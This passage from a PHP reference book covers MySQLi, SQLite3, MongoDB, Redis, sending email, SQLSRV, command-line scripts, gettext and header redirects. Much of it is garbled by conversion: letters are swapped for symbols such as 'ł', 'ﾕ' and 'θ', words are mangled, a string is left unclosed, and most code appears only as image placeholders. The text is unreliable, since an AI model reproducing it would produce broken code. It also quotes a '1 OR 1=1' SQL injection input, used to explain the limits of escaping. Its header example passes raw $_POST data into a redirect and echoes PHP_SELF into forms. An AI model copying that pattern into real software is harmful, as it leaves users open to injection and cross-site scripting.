Escaping strings is an older (and less secure) method of securing data for insertion into a query. It works by using MySQL's function mysql\_real\_escape\_string() to process and sanitize the data (in other words, PHP is not doing the escaping). The MySQLi API provides direct access to this function

![](image_rsrcMY7.jpg)

At this point, you have a string that MySQL considers to be safe for use in a direct query

![](image_rsrcMY8.jpg)

safe. Consider the following example

![](image_rsrcMY9.jpg)

1 OR 1=1 does not represent data that MySQL will escape, yet this still represents SQL injection. There are other examples as well that represent places where it returns unsafe data. The problem is that MySQL's escaping function is designed to make data comply with SQL syntax. It's NOT designed to make sure that MySQL can't confuse user data for SQL instructions.

Section 59.6: Debugging SQL in M6SQLi

So your query has failed (see MySQLi connect for how we made $conn)

![](image_rsrcMYA.jpg)

How do we find out what happened? $result is false so that's no help. Thankfully the connect $conn can tell us what MySQL told us about the failure

![](image_rsrcMYB.jpg)

or procedural

![](image_rsrcMYC.jpg)

![](image_rsrcKH6.jpg)You should get an error similar to

Table 'my\_db.non\_existent\_table' doesn't exist

Section 59.7: M6SQLi quer6

The query function takes a valid SQL string and executes it directly against the database connection $conn

Object oriented style

![](image_rsrcMYD.jpg)

Procedural style

![](image_rsrcMYE.jpg)

![](image_rsrcM38.jpg)CAUTION

A common problem here is that people will simply execute the query and expect it to work (i.e. return a mysqli\_stmt object). Since this function takes only a string, you're building the query first yourself. If there are any mistakes in the SQL at all, the MySQL compiler will fail, at which point this function will return false.

![](image_rsrcMYF.jpg)

![](image_rsrcKN7.jpg)The above code will generate a E\_FATAL error because $result is false, and not an object.

PHP Fatal error: Call to a member function fetch\_assoc() on a non-object

The procedural error is similar, but not fatal, because we're just violating the expectations of the function.

![](image_rsrcMYG.jpg)

![](image_rsrcKH6.jpg)You will get the following message from PHP

mysqli\_fetch\_array() expects parameter 1 to be mysqli\_result, boolean given

You can avoid this by doing a test first

![](image_rsrcMYH.jpg)

Section 59.8: How to get data from a prepared statement

Prepared statements

See Prepared statements in MySQLi for how to prepare and execute a query. Binding of results

Object-oriented style

![](image_rsrcMYJ.jpg)

Procedural style

![](image_rsrcMYK.jpg)

The problem with using bind\_result is that it requires the statement to specify the columns that will be used. This means that for the above to work the query must have looked like this SELECT forename FRON users. To include more columns simply add them as parameters to the bind\_result function (and ensure that you add them to the SQL query).

In both cases, we're assigning the forename column to the $forename variable. These functions take as many arguments as columns you want to assign. The assignment is only done once, since the function binds by reference.

![](image_rsrcMYM.jpg)

We can then loop as follows: Object-oriented style

Procedural style

![](image_rsrcMYN.jpg)

The drawback to this is that you have to assign a lot of variables at once. This makes keeping track of large queries difficult. If you have MySQL Native Driver (mysqlnd) installed, all you need to do is use get\_result.

Object-oriented style

![](image_rsrcMYP.jpg)

Procedural style

![](image_rsrcMYR.jpg)

This is much easier to work with because now we're getting a mysqli\_result object. This is the same object that mysqli\_query returns. This means you can use a regular result loop to get your data.

What if I cannot install mysqlnd?

If that is the case then @Sophivorus has you covered with this amazing answer.

This function can perform the task of get\_result without it being installed on the server. It simply loops through the results and builds an associative array

![](image_rsrcMYS.jpg)

We can then use the function to get results like this, just as if we were using mysqli\_fetch\_assoc()

![](image_rsrcMYT.jpg)

It will have the same output as if you were using the mysqlnd driver, except it does not have to be installed. This is very useful if you are unable to install said driver on your system. Just implement this solution.

324

Section 59.9: M6SQLi Insert ID

Retrieve the last ID generated by an INSERT query on a table with an AUTO\_INCREMENT column. Object-oriented Style

![](image_rsrcMYU.jpg)

Procedural Style

![](image_rsrcMYV.jpg)

![](image_rsrcKNA.jpg)Returns zero if there was no previous query on the connection or if the query did not update an AUTO\_INCREMENT value.

Insert id when updating rows

Normally an UPDATE statement does not return an insert id, since an AUTO\_INCREMENT id is only returned when a new row has been saved (or inserted). One way of making updates to the new id is to use INSERT ... ON DUPLICATE KEY UPDATE syntax for updating.

Setup for examples to follow:

![](image_rsrcMYW.jpg)

The case of IODKU performing an "update" and LAST\_INSERT\_ID() retrieving the relevant id:

![](image_rsrcMYX.jpg)$sql \= "INSERT INTO iodku (name, misc) VALUES

('Sally', 3333)

ON DUPLICATE KEY UPDATE id = LAST\_INSERT\_ID(id),

misc \= VALUES(misc)";

$conn\->query($sql);

$id \= $conn\->insert\_id;

\-- should update

\-- \`name\` will trigger "duplicate key"

\-- picking up existing value (2)

The case where IODKU performs an "insert" and LAST\_I3NS2E5RT\_ID() retrieves the new id:

![](image_rsrcMYY.jpg)$sql \= "INSERT INTO iodku (name, misc) VALUES

('Dana', 789)

ON DUPLICATE KEY UPDATE id = LAST\_INSERT\_ID(id),

misc \= VALUES(misc);

‡conn->query(‡sql);

‡id \= ‡conn->insert\_id;

\-- Should insert

\-- picking up new value (3)

![](image_rsrcMYZ.jpg)

Resulting table contents:

![](image_rsrcMZ0.jpg)

326

Chapter 60: SQLite3

Section 60.1: SQLite3 Quickstart Tutorial

This is a complete example of all the commonly used SQLite related APIs. The aim is to get you up and running really fast. You can also get a runnable PHP file of of this tutorial.

Creating/opening a database

Let's create a new database first. Create it only if the file doesn't exist and open it for reading/writing. The extension of the file is up to you, but .sqlite is pretty common and self-explanatory.

![](image_rsrcMZ1.jpg)

Creating a table

![](image_rsrcMZ2.jpg)

Inserting sample data.

It's advisable to wrap related queries in a transaction (with keywords BEGIN and COMMIT), even if you don't care about atomicity. If you don't do this, SQLite automatically wraps every single query in a transaction, which slows down everything immensely. If you're new to SQLite, you may be surprised why the INSERTs are so slow .

![](image_rsrcMZ3.jpg)

Insert potentially unsafe data with a prepared statement. You can do this with named parameters:

![](image_rsrcMZ4.jpg)

Fetching data

Let's fetch today's visits of user #42. We'll use a prepared statement again, but with numbered parameters this time, which are more concise:

![](image_rsrcMZ5.jpg)

![](image_rsrcMZ6.jpg)

![](image_rsrcMZ7.jpg)Note: If there are no more rows, fetchArray() returns false. You can take advantage of this in a while

loop.

Free the memory - this in not done automatically, while your script is running

![](image_rsrcMZ8.jpg)

Shorthands

Here's a useful shorthand for fetching a single row as an associative array. The second parameter means we want all the selected columns.

Watch out, this shorthand doesn't support parameter binding, but you can escape the strings instead. Always put the values in SINGLE quotes! Double quotes are used for table and column names (similar to backticks in MySQL).

![](image_rsrcMZ9.jpg)

Another useful shorthand for retrieving just one value.

![](image_rsrcMZA.jpg)

Cleaning up

Finally, close the database. This is done automatically when the script finishes, though.

![](image_rsrcMZB.jpg)

Section 60.2: Quer6ing a database

![](image_rsrcMZC.jpg)

See also [http://stackoverflow.com/documentation/sql/topics](http://stackoverflow.com/documentation/sql/topics)

Section 60.3: Retrieving onl6 one result

In addition to using LIMIT SQL statements you can also use the SQLite3 function querySingle to retrieve a single row, or the first column.

![](image_rsrcMZD.jpg)

Chapter 61: Using MongoDB

Section 61.1: Connect to MongoDB

Create a MongoDB connection, that later you can query:

![](image_rsrcMZE.jpg)

In the next example, you will learn how to query the connection object.

This extension close the connection automatically, it's not necessary to close manually.

Section 61.2: Get multiple documents \- find()

Example for searching multiple users with the name "Mike":

![](image_rsrcMZF.jpg)

Section 61.3: Get one document - findOne()

Example for searching just one user with a specific id, you should do:

![](image_rsrcMZG.jpg)

Section 61.4: Insert document

Example for adding a document:

![](image_rsrcMZH.jpg)

Section 61.5: Update a document

Example for updating all documents where name is equal to "John":

![](image_rsrcMZJ.jpg)

Section 61.6: Delete a document

Example for deleting all documents where name is equal to "Peter":

![](image_rsrcMZK.jpg)

Chapter 62: mongo-php

Section 62.1: Ever6thing in between MongoDB and Php

Requirements

![](image_rsrcMZM.jpg)MongoDB server running on port usually 27017. (type mongod on command prompt to run mongodb server)

![](image_rsrcMZN.jpg)Php installed as either cgi or fpm with MongoDB extension installed(MongoDB extension is not bundled with default php)

![](image_rsrcMZP.jpg)Composer library(mongodb/mongodb).(In the project root run php composer.phar require

![](image_rsrcKN7.jpg)"mongodb/mongodb=^1.θ.θ" to install the MongoDB library) If everything is ok you are ready to move on.

Check For Php installation

if not sure check Php installation by running php \-v on command prompt will return something like this

![](image_rsrcKH6.jpg)PHP 7.θ.6 (cli) (built: Apr 28 2θ16 14:12:14) ( ZTS ) Copyright (c) 1997-2θ16 The PHP Group Zend Engine v3.θ.θ, Copyright (c) 1998-2θ16 Zend Technologies

Check For MongoDB installation

![](image_rsrcKH6.jpg)Check MongoDB installation by running mongo \--version will return MongoDB shell version: 3.2.6

Check For Composer installation

Check for Composer installation by running php composer.phar \--version will return Composer version 1.2\-dev (3dθ9c17b489cd29aθcθb3b11e731987e7θ97797d) 2θ16-θ8\-3θ 16:12:39 \`

Connecting to MongoDB from php

![](image_rsrcMZR.jpg)

![](image_rsrcMZS.jpg)

The above code will connect using MongoDB composer library(mongodb/mongodb) included as vendor/aułoﾕoad.php to connect to the MongoDB server running on porł: 27017. If everything is ok it will connect and list an array, if exception occurs connecting to MongoDB server the message will be printed.

CREATE(Inserting) into MongoDB

![](image_rsrcMZT.jpg)

![](image_rsrcMZU.jpg)In the example we are using the $mongo instance previously used in the Connecłing ło MongoDB from php part. MongoDB uses JSON type data format, so in php we will use array to insert data into MongoDB, this conversion from array

to Json and vice versa will be done by mongo library. Every document in MongoDB has a unique id named as \_id,during insertion we can get this by using $resuﾕł\-\>gełInserłedId();

READ(Find) in MongoDB

![](image_rsrcMZV.jpg)

Drop in MongoDB

![](image_rsrcMZW.jpg)

![](image_rsrcMZX.jpg)There are many methods that can be performed on $coﾕﾕecłion see Official documentation from MongoDB

Chapter 63: Using Redis with PHP

Section 63.1: Connecting to a Redis instance

Assuming a default server running on localhost with the default port, the command to connect to that Redis server would be:

![](image_rsrcMZY.jpg)

Section 63.2: Installing PHP Redis on Ubuntu

To install PHP on Ubuntu, first install the Redis server:

![](image_rsrcMZZ.jpg)

then install the PHP module:

![](image_rsrcN00.jpg)

And restart the Apache server:

![](image_rsrcN01.jpg)

Section 63.3: Executing Redis commands in PHP

The Redis PHP module gives access to the same commands as the Redis CLI client so it is quite straightforward to use.

The syntax is as follow:

![](image_rsrcN02.jpg)

Chapter 64: Sending Email

Parameter​Details

string $to​The recipient email address

string $subject​The subject line

string $message​The body of the email

string $additional\_headers​Optional: headers to add to the email

![](image_rsrcN03.jpg)Optional: arguments to pass to the configured mail send application in the command line

Section 64.1: Sending Email - The basics, more details, and a full example

A typical email has three main components:

1.  A recipient (represented as an email address)

2.  A subject

3.  A message body

Sending mail in PHP can be as simple as calling the built-in function mail(). mail() takes up to five parameters but the first three are all that is required to send an email (although the four parameters is commonly used as will be demonstrated below). The first three parameters are:

1.  The recipient's email address (string)

2.  The email's subject (string)

![](image_rsrcN04.jpg)

3.  The body of the email (string) (e.g. the content of the email) A minimal example would resemble the following code:

The simple example above works well in limited circumstances such as hardcoding an email alert for an internal system. However, it is common to place the data passed as the parameters for mail() in variables to make the code cleaner and easier to manage (for example, dynamically building an email from a form submission).

Additionally, mail() accepts a fourth parameter which allows you to have additional mail headers sent with your email. These headers can allow you to set:

![](image_rsrcN05.jpg)the From name and email address the user will see

![](image_rsrcN06.jpg)the Reply\-To email address the user's response will be sent to

![](image_rsrcN07.jpg)additional non-standards headers like X\-Mailer which can tell the recipient this email was sent via PHP

![](image_rsrcN08.jpg)

The optional fifth parameter can be used to pass additional flags as command line options to the program

can be used to set the envelope sender address when using sendmail/postfix with the \-f sendmail option.

![](image_rsrcN09.jpg)

Although using mail() can be pretty reliable, it is by no means guaranteed that an email will be sent when mail() is called. To see if there is a potential error when sending your email, you should capture the return value from mail(). TRUE will be returned if the mail was successfully accepted for delivery. Otherwise, you will receive FALSE.

![](image_rsrcN0A.jpg)

NOTE: Although mail() may return TRUE, it does not mean the email was sent or that the email will be received by the recipient. It only indicates the mail was successfully handed over to your system's mail system successfully.

If you wish to send an HTML email, there isn't a lot more work you need to do. You need to:

1.  Add the MIME\-Version header

2.  Add the Content\-Type header

3.  Make sure your email content is HTML

![](image_rsrcN0B.jpg)

Here's a full example of using PHP's mail() function

![](image_rsrcN0C.jpg)

![](image_rsrcN0D.jpg)

See Also

Official documentation

![](image_rsrcN0E.jpg)mail()

![](image_rsrcN0F.jpg)PHP mail() configuration

Related Stack Overflow Questions

![](image_rsrcN0G.jpg)PHP mail form doesn't complete sending e-mail

![](image_rsrcN0H.jpg)![](image_rsrcN0J.jpg)How do you make sure email you send programmatically is not automatically marked as spam? How to use SMTP to send email

![](image_rsrcN0K.jpg)Setting envelope from address

Alternative Mailers

![](image_rsrcN0M.jpg)![](image_rsrcN0N.jpg)![](image_rsrcN0P.jpg)PHPMailer SwiftMailer PEAR::Mail

Email Servers

![](image_rsrcN0R.jpg)Mercury Mail (Windows)

Related Topics

![](image_rsrcN0S.jpg)Post/Redirect/Get

Section 64.2: Sending HTML Email Using mail()

![](image_rsrcN0T.jpg)

![](image_rsrcN0U.jpg)

This is not much different then sending a plain text email. Thet key differences being the content body is structured like an HTML document and there are two additional headers that must be included so the email client knows to trender the email as HTML. They are:

![](image_rsrcN0V.jpg)MIME-Version: 1.0

![](image_rsrcN0W.jpg)Content-Type: text/html; charset=UTF-8

Section 64.3: Sending Email With An Attachment Using mail()

![](image_rsrcN0X.jpg)<?php

$to​\= 'recipient@example.com';

$subject​\= 'Email Subject';

$message​\= 'This is the email message body';

$attachment \= '/path/to/your/file.pdf';

$content \= file\_get\_contents($attachment);

/\* Ałłachmenł conłenł łransferred in Base64 encoding MUST be spﾕił inło chunks 76 characłers in ﾕengłh as specified by RFC 2045 secłion 6.8. By defauﾕł, łhe funcłion chunk\_spﾕił() uses a chunk ﾕengłh of 76 wiłh a łraiﾕing CRLF (\\r\\n). The 76 characłer requiremenł does noł incﾕude łhe carriage rełurn and ﾕine feed \*/

$content \= chunk\_split(base64\_encode($content));

/\* Boundaries deﾕimił muﾕłiparł enłiłies. As słałed in RFC 2046 secłion 5.1, łhe boundary MUST NOT occur in any encapsuﾕałed parł. Therefore, ił shouﾕd be unique. As słałed in łhe foﾕﾕowing secłion 5.1.1, a

boundary is defined as a ﾕine consisłing of łwo hyphens ("--"), a paramełer vaﾕue, opłionaﾕ ﾕinear whiłespace, and a łerminałing CRLF. \*/

$prefix​\= "part\_"; // This is an opłionaﾕ prefix

/\* Generałe a unique boundary paramełer vaﾕue wiłh our prefix using łhe uniqid() funcłion. The second paramełer makes łhe paramełer vaﾕue more unique. \*/

$boundary​\= uniqid($prefix, true);

// headers

$headers​\= implode("\\r\\n", \[ 'From: webmaster@example.com', 'Reply-To: webmaster@example.com', 'X-Mailer: PHP/' . PHP\_VERSION,

'MIME-Version: 1.θ',

// boundary paramełer required, musł be encﾕosed by quołes

'Content-Type: multipart/mixed; boundary="' . $boundary . '"',

"Content-Transfer-Encoding: 7bit",

"This is a MIME encoded message." // message for resłricłed łransporłs

\]);

339

![](image_rsrcN0Y.jpg)// message and ałłachmenł

$message​\= implode("\\r\\n", \[

"--" . $boundary, // header boundary deﾕimiłer ﾕine

'Content-Type: text/plain; charset="iso-8859-1"',

"Content-Transfer-Encoding: 8bit",

$message,

"--" . $boundary, // conłenł boundary deﾕimiłer ﾕine

'Content-Type: application/octet-stream; name="RenamedFile.pdf"',

"Content-Transfer-Encoding: base64", "Content-Disposition: attachment",

$content,

"--" . $boundary . "--" // cﾕosing boundary deﾕimiłer ﾕine

\]);

$result \= mail($to, $subject, $message, $headers); // send łhe emaiﾕ

if ($result) {

// Success! Redirecł ło a łhank you page. Use łhe

// POST/REDIRECT/GET pałłern ło prevenł form resubmissions

// when a user refreshes łhe page.

header('Location: [http://example.com/path/to/thank-you.php',](http://example.com/path/to/thank-you.php%27) true, 3θ3);

exit;

}

else {

// Your maiﾕ was noł senł. Check your ﾕogs ło see if

// łhe reason was reporłed łhere for you.

}

Content-Transfer-Encodings

The available encodings are 7bit, 8bit, binary, quoted-printable, base64, ietf-token, and x-token. Of these encodings, when a header has a multipart Content-Type, the Content-Transfer-Encoding must not be any other value other than 7bit, 8bit, or binary as stated in RFC 2045, section 6.4.

Our example chooses the 7bit encoding, which represents US-ASCII characters, for the multipart header because, as noted in RFC 2045 section 6, some protocols support only this encoding. Data within the boundaries can then be encoded on a part-by-part basis (RFC 2046, section 5.1). This example does exactly this. The first part, which contains the text/plain message, is defined to be 8bit since it may be necessary to support additional characters. In this case, the Latin1 (iso-8859-1) character set is being used. The second part is the attachment and so it is defined as a base64-encoded application/octet-stream. Since base64 transforms arbitrary data into the 7bit range, it can be sent over restricted transports (RFC 2045, section 6.2).

Section 64.4: Sending Plain Text Email Using PHPMailer

Basic Text Email

![](image_rsrcN0Z.jpg)

![](image_rsrcN10.jpg)

Adding addtional recipients, CC recipients, BCC recipients

![](image_rsrcN11.jpg)

Section 64.5: Sending HTML Email Using PHPMailer

![](image_rsrcN12.jpg)

![](image_rsrcN13.jpg)

Section 64.6: Sending Email With An Attachment Using PHPMailer

![](image_rsrcN14.jpg)<?php

$mail \= new PHPMailer();

$mail\->From​\= "[from@example.com](mailto:from@example.com)";

$mail\->FromName \= "Full Name";

$mail\->addReplyTo("[reply@example.com](mailto:reply@example.com)", "Reply Address");

$mail\->Subject \= "Subject Text";

$mail\->Body​\= "This is a sample basic text email with an attachment using PHPMailer.";

// Add Słałic Ałłachmenł

$attachment \= '/path/to/your/file.pdf';

$mail\->AddAttachment($attachment , 'RenamedFile.pdf');

// Add Second Ałłachmenł, run-łime creałed. ie: CSV ło be open wiłh Exceﾕ

$csvHeader \= "header1,header2,header3";

$csvData \= "row1col1,row1col2,row1col3\\nrow2col1,row2col2,row2col3";

$mail\->AddStringAttachment($csvHeader ."\\n" . $csvData, 'your-csv-file.csv', 'base64', 'application/vnd.ms-excel');

if($mail\->send()) {

// Success! Redirecł ło a łhank you page. Use łhe

// POST/REDIRECT/GET pałłern ło prevenł form resubmissions

// when a user refreshes łhe page.

header('Location: [http://example.com/path/to/thank-you.php',](http://example.com/path/to/thank-you.php%27) true, 3θ3);

exit;

}

else {

echo "Error: " . $mail\->ErrorInfo;

}

Section 64.7: Sending Plain Text Email Using Sendgrid

Basic Text Email

![](image_rsrcN15.jpg)

Adding addtional recipients, CC recipients, BCC recipients

![](image_rsrcN16.jpg)

Section 64.8: Sending Email With An Attachment Using Sendgrid

![](image_rsrcN17.jpg)

Chapter 65: Using SQLSRV

Section 65.1: Retrieving Error Messages

When a query goes wrong, it is important to fetch the error message(s) returned by the driver to identify the cause of the problem. The syntax is:

![](image_rsrcN18.jpg)

This returns an array with:

Key​Description

SQLSTATE The state that the SQL Server / OBDC Driver is in code​The SQL Server error code

message The description of the error

It is common to use the above function like so:

![](image_rsrcN19.jpg)

Section 65.2: Fetching Quer6 Results

There are 3 main ways to fetch results from a query: sqlsrv\_fetch\_array()

sqlsrv\_fetch\_array() retrieves the next row as an array.

![](image_rsrcN1A.jpg)

sqlsrv\_fetch\_array() has an optional second parameter to fetch back different types of array: SQLSRV\_FETCH\_ASSOC, SQLSRV\_FETCH\_NUMERIC and SQLSRV\_FETCH\_BOTH(default) can be used; each returns the associative, numeric, or associative and numeric arrays, respectively.

sqlsrv\_fetch\_object()

![](image_rsrcN1B.jpg)

sqlsrv\_fetch()

sqlsrv\_fetch() makes the next row available for reading.

![](image_rsrcN1C.jpg)

Section 65.3: Creating a Connection

![](image_rsrcN1D.jpg)

SQLSRV also has a PDO Driver. To connect using PDO:

![](image_rsrcN1E.jpg)

Section 65.4: Making a Simple Quer6

![](image_rsrcN1F.jpg)

Note: the use of square brackets \[\] is to escape the word table as it is a reserved word. These work in the same way as backticks \` do in MySQL.

Section 65.5: Invoking a Stored Procedure

To call a stored procedure on the server:

![](image_rsrcN1G.jpg)

![](image_rsrcN1H.jpg)

Section 65.6: Making a Parameterised Quer6

![](image_rsrcN1J.jpg)

If you plan on using the same query statement more than once, with different parameters, the same can be achieved with the sqlsrv\_prepare() and sqlsrv\_execute() functions, as shown below:

![](image_rsrcN1K.jpg)

346

Chapter 66: Command Line Interface (CLI)

Section 66.1: Handling Program Options

Program options can be handled with the getopt() function. It operates with a similar syntax to the POSIX getopt

command, with additional support for GNU-style long options.

![](image_rsrcN1M.jpg)#!/usr/bin/php

// a singﾕe coﾕon indicałes łhe opłion łakes a vaﾕue

// a doubﾕe coﾕon indicałes łhe vaﾕue may be omiłłed

$shortopts \= "hf:v::d";

// GNU-słyﾕe ﾕong opłions are noł required

$longopts \= \["help", "version"\];

$opts \= getopt($shortopts, $longopts);

// opłions wiłhouł vaﾕues are assigned a vaﾕue of booﾕean faﾕse

// you musł check łheir exisłence, noł łheir łrułhiness

if (isset($opts\["h"\]) || isset($opts\["help"\])) {

fprintf(STDERR, "Here is some help!\\n"); exit;

}

// ﾕong opłions are caﾕﾕed wiłh łwo hyphens: "--version"

if (isset($opts\["version"\])) {

fprintf(STDERR, "%s Version 223.45" . PHP\_EOL, $argv\[θ\]); exit;

}

// opłions wiłh vaﾕues can be caﾕﾕed ﾕike "-f foo", "-ffoo", or "-f=foo"

$file \= "";

if (isset($opts\["f"\])) {

$file \= $opts\["f"\];

}

if (empty($file)) {

fprintf(STDERR, "We wanted a file!" . PHP\_EOL); exit(1);

}

fprintf(STDOUT, "File is %s" . PHP\_EOL, $file);

// opłions wiłh opłionaﾕ vaﾕues musł be caﾕﾕed ﾕike "-v5" or "-v=5"

$verbosity \= θ;

if (isset($opts\["v"\])) {

$verbosity \= ($opts\["v"\] \=== false) ? 1 : (int)$opts\["v"\];

}

fprintf(STDOUT, "Verbosity is %d" . PHP\_EOL, $verbosity);

// opłions caﾕﾕed muﾕłipﾕe łimes are passed as an array

$debug \= θ;

if (isset($opts\["d"\])) {

$debug \= is\_array($opts\["d"\]) ? count($opts\["d"\]) : 1;

}

fprintf(STDOUT, "Debug is %d" . PHP\_EOL, $debug);

// łhere is no aułomałed way for gełopł ło handﾕe unexpecłed opłions

This script can be tested like so:

![](image_rsrcN1N.jpg)

![](image_rsrcN1P.jpg)

Note the last method will not work because \-v 5 is not valid.

![](image_rsrcM38.jpg)Note: As of PHP 5.3.0, getopt is OS independent, working also on Windows.

Section 66.2: Argument Handling

Arguments are passed to the program in a manner similar to most C-style languages. $argc is an integer containing the number of arguments including the program name, and $argv is an array containing arguments to the program. The first element of $argv is the name of the program.

![](image_rsrcN1R.jpg)

![](image_rsrcN1S.jpg)Calling the above application with php example.php foo bar (where example.php contains the above code) will result in the following output:

You called the program example.php with 2 arguments Argument 1 is foo

Argument 2 is bar

Note that $argc and $argv are global variables, not superglobal variables. They must be imported into the local scope using the global keyword if they are needed in a function.

This example shows the how arguments are grouped when escapes such as "" or \\ are used. Example script

![](image_rsrcN1T.jpg)

Command line

![](image_rsrcN1U.jpg)$ php argc.argv.php \--this\-is\-an\-option three\\ words\\ together or "in one quote" spaces\\ counted\\ as\\ one

int(6) array(6) {

\[θ\]=>

string(13) "argc.argv.php" \[1\]=>

string(19) "--this-is-an-option" \[2\]=>

string(2θ) "three words together" \[3\]=>

but\\ multiple\\

string(2) "or"

348

![](image_rsrcN1V.jpg)

If the PHP script is run using \-r:

![](image_rsrcN1W.jpg)

Or code piped into STDIN of php:

![](image_rsrcN1X.jpg)

Section 66.3: Input and Output Handling

When run from the CLI, the constants STDIN, STDOUT, and STDERR are predefined. These constants are file handles, and can be considered equivalent to the results of running the following commands:

![](image_rsrcN1Y.jpg)

The constants can be used anywhere a standard file handle would be:

![](image_rsrcN1Z.jpg)

The builtin stream addresses referenced earlier (php://słdin, php://słdouł, and php://słderr) can be used in place of filenames in most contexts:

![](image_rsrcN20.jpg)

![](image_rsrcN21.jpg)

As an alternative, you can also use readline() for input, and you can also use echo or print or any other string printing functions for output.

![](image_rsrcN22.jpg)

Section 66.4: Return Codes

The exit construct can be used to pass a return code to the executing environment.

![](image_rsrcN23.jpg)

By default an exit code of θ will be returned if none is provided, i.e. exit is the same as exit(θ). As exit is not a function, parentheses are not required if no return code is being passed.

Return codes must be in the range of 0 to 254 (255 is reserved by PHP and should not be used). By convention, exiting with a return code of θ tells the calling program that the PHP script ran successfully. Use a non-zero return code to tell the calling program that a specific error condition occurred.

Section 66.5: Restrict script execution to command line

The function php\_sapi\_name() and the constant PHP\_SAPI both return the type of interface (Server API) that is being used by PHP. They can be used to restrict the execution of a script to the command line, by checking whether the output of the function is equal to cli.

![](image_rsrcN24.jpg)

The drupal\_is\_cli() function is an example of a function that detects whether a script has been executed from the command line:

![](image_rsrcN25.jpg)

Section 66.6: Behavioural differences on the command line

When running from the CLI, PHP exhibits some different behaviours than when run from a web server. These differences should be kept in mind, especially in the case where the same script might be run from both

![](image_rsrcN26.jpg)No directory change When running a script from a web server, the current working directory is always that of the script itself. The code require("./stuff.inc"); assumes the file is in the same directory as the script. On the command line, the current working directory is the directory you're in when you call the script. Scripts that are going to be called from the command line should always use absolute paths. (Note the magic constants  DIR and  FILE continue to work as expected, and return the location of the script.)

![](image_rsrcN27.jpg)No output buffering The php.ini directives output\_buffering and implicit\_flush default to false and true, respectively. Buffering is still available, but must be explicitly enabled, otherwise output will always be displayed in real time.

![](image_rsrcN28.jpg)No time limit The php.ini directive max\_execution\_time is set to zero, so scripts will not time out by default.

![](image_rsrcN29.jpg)No HTML errors In the event you have enabled the php.ini directive html\_errors, it will be ignored on the command line.

![](image_rsrcN2A.jpg)Different php.ini can be loaded. When you are using php from cli it can use different php.ini than web server do. You can know what file is using by running php \--ini.

Section 66.7: Running 6our script

On either Linux/UNIX or Windows, a script can be passed as an argument to the PHP executable, with that script's options and arguments following:

![](image_rsrcN2B.jpg)

This passes foo and bar as arguments to example.php.

On Linux/UNIX, the preferred method of running scripts is to use a shebang (e.g. #!/usr/bin/env php) as the first line of a file, and set the executable bit on the file. Assuming the script is in your path, you can then call it directly:

![](image_rsrcN2C.jpg)

Using /usr/bin/env php makes the PHP executable to be found using the PATH. Following how PHP is installed, it might not be located at the same place (such as /usr/bin/php or /usr/local/bin/php), unlike env which is commonly available from /usr/bin/env.

On Windows, you could have the same result by adding the PHP's directory and your script to the PATH and editing PATHEXT to allow .php to be detected using the PATH. Another possibility is to add a file named example.bat or example.cmd in the same directory as your PHP script and write this line into it:

![](image_rsrcN2D.jpg)

Or, if you added PHP's directory into the PATH, for convenient use:

![](image_rsrcN2E.jpg)

Section 66.8: Edge Cases of getopt()

This example shows the behaviour of getopt when the user input is uncommon:

getopt.php

![](image_rsrcN2F.jpg)

![](image_rsrcN2G.jpg)

From this example, it can be seen that:

![](image_rsrcN2H.jpg)Individual options (no colon) always carry a boolean value of false if enabled.

![](image_rsrcN2J.jpg)If an option is repeated, the respective value in the output of getopt will become an array.

![](image_rsrcN2K.jpg)Required argument options (one colon) accept one space or no space (like optional argument options) as separator

![](image_rsrcN2M.jpg)After one argument that cannot be mapped into any options, the options behind will not be mapped either.

Section 66.9: Running built-in web server

As from version 5.4, PHP comes with built-in server. It can be used to run application without need to install other http server like nginx or apache. Built-in server is designed only in controller environment for development and testing purposes.

It can be run with command php -S :

To test it create index.php file containing

![](image_rsrcN2N.jpg)

and run command php \-S localhost:8θ8θ

Now yout should be able to see content in browser. To check this, navigate to http://ﾕocaﾕhosł:8080

Every access should result in log entry written to terminal

![](image_rsrcN2P.jpg)

Chapter 67: Localization

Section 67.1: Localizing strings with gettext()

GNU gettext is an extension within PHP that must be included at the php.ini: extension=php\_gettext.dll #Windows extension=gettext.so #Linux

The gettext functions implement an NLS (Native Language Support) API which can be used to internationalize your PHP applications.

Translating strings can be done in PHP by setting the locale, setting up your translation tables and calling gettext()

on any string you want to translate.

![](image_rsrcN2R.jpg)

myPHPApp.po

![](image_rsrcN2S.jpg)

gettext() loads a given post-complied .po file, a .mo. which maps your to-be translated strings as above. After this small bit of setup code, translations will now be looked for in the following file:

![](image_rsrcN2T.jpg)./locale/fr\_FR/LC\_MESSAGES/myPHPApp.mo.

Whenever you call gettext('some string'), if 'some string' has been translated in the .mo file, the translation will be returned. Otherwise, 'some string' will be returned untranslated.

![](image_rsrcN2U.jpg)

Chapter 68: Headers Manipulation

Section 68.1: Basic Setting of a Header

Here is a basic setting of the Header to change to a new page when a button is clicked.

![](image_rsrcN2V.jpg)if(isset($\_REQUEST\['action'\]))

{

switch($\_REQUEST\['action'\])

{ //Sełłing łhe Header based on which bułłon is cﾕicked

case 'getState':

header("Location: [http://NewPageForState.com/getState.php?search=](http://newpageforstate.com/getState.php?search) " . $\_POST\['search'\]); break;

case 'getProject':

header("Location: [http://NewPageForProject.com/getProject.php?search=](http://newpageforproject.com/getProject.php?search)" .

$\_POST\['search'\]);

break;

}

else

{

}

GetSearchTerm(!NULL);

//Forms ło enłer a Słałe or Projecł and cﾕick search

function GetSearchTerm($success)

{

if (is\_null($success))

{

echo "<h4>You must enter a state or project number</h4>";

}

echo "<center><strong>Enter the State to search for</strong></center><p></p>";

//Using łhe $\_SERVER\['PHP\_SELF'\] keeps us on łhis page łiﾕﾕ łhe swiłch above dełermines where ło

go

echo "<form action='" . $\_SERVER\['PHP\_SELF'\] . "' enctype='multipart/form-data' method='POST'>

<input type='hidden' name='action' value='getState'>

<center>State: <input type='text' name='search' size='1θ'></center><p></p>

<center><input type='submit' name='submit' value='Search State'></center>

</form>";

GetSearchTermProject($success);

}

function GetSearchTermProject($success)

{

echo "<center><br><strong>Enter the Project to search for</strong></center><p></p>";

echo "<form action='" . $\_SERVER\['PHP\_SELF'\] . "' enctype='multipart/form-data' method='POST'>

<input type='hidden' name='action' value='getProject'>

<center>Project Number: <input type='text' name='search' size='1θ'></center><p></p>

<center><input type='submit' name='submit' value='Search Project'></center>

</form>";

}

?>

Chapter 69: Coding Conventions

Section 69.1: PHP Tags

You should always use <?php ?> tags or short-echo tags <?= ?>. Other variations (in particular, short tags <? ?>) should not be used as they are commonly disabled by system administrators.

When a file is not expected to produce output (the entire file is PHP code) the closing ?> syntax should be omitted to avoid unintentional output, which can cause problems when a client parses the document, in particular some browsers fail to recognise the <!DOCTYPE tag and activate Quirks Mode.

